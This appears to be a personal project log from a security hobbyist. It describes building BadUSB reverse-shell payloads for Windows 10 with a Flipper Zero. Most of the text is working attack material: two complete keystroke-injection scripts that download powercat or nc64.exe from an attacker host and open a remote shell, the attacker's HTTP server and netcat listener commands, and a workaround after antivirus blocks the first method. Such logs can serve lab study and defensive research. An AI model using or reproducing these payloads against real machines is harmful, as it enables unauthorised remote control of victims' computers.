### 19.9.2023:
Demo for Reverse Shell done.   
[Demo](../../payloads/revshell_demo)   
[Demo in action](https://youtu.be/8v6djrHg2qI)   

### 26.9.2023

Today i started to figure out a way to get a reverse shell in Windows 10, without user interaction.

Sources i used for this experiment:   
https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/  
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows  
https://github.com/martinsohn/PowerShell-reverse-shell  
https://gist.github.com/methanoliver/efebfe8f4008e167417d4ab96e5e3cac  
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell  
https://hackernoon.com/how-to-get-a-reverse-shell-on-macos-using-a-flipper-zero-as-a-badusb  
https://github.com/UNC0V3R3D/Flipper_Zero-BadUsb/blob/main/BadUsb-Collection/Windows_Badusb/FUN/FakeBluescreen/FakeBluescreen.txt  
https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl  

Used Flipper Zero BadUSB, as the Digispark havent arrived yet, and the code itself should be compatible, or atleast easily converted to work with Digispark.   

A simplest example, combined from several other ready made scripts:
```bash
REM Description: BadUSB Reverse Shell
DELAY 500
GUI r
DELAY 400
STRING cmd
ENTER
DELAY 400
STRING powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.66.2/powercat.ps1');powercat -c 192.168.66.2 -p 9001 -e cmd"
DELAY 400
ENTER
```

Need webserver (serving the powercat.ps1 script)   

Example from attacker machine:   
```bash
┌──(kali🥦kali)-[~/testing]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

And listener, in the attacker machine (where the shell will be opened):   
```bash
┌──(kali🥦kali)-[~]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
```

This works, BUT Windows - Virus Protection blocks it.

Temporary resolution:   
```bash
REM Description: BadUSB Reverse Shell
DELAY 500
GUI r
DELAY 400
STRING powershell
ENTER
DELAY 400
STRING Invoke-WebRequest -OutFile nc64.exe -Uri http://192.168.66.2/nc64.exe
DELAY 400
ENTER
DELAY 400
GUI r
DELAY 400
STRING cmd
ENTER
DELAY 400
STRING start /min nc64.exe 192.168.66.2 9001 -e powershell
DELAY 400
ENTER
```

So the attacker servers the nc64.exe.   
Victim downloads it, and while running it, it calls to the attacker and opens an interactive shell.

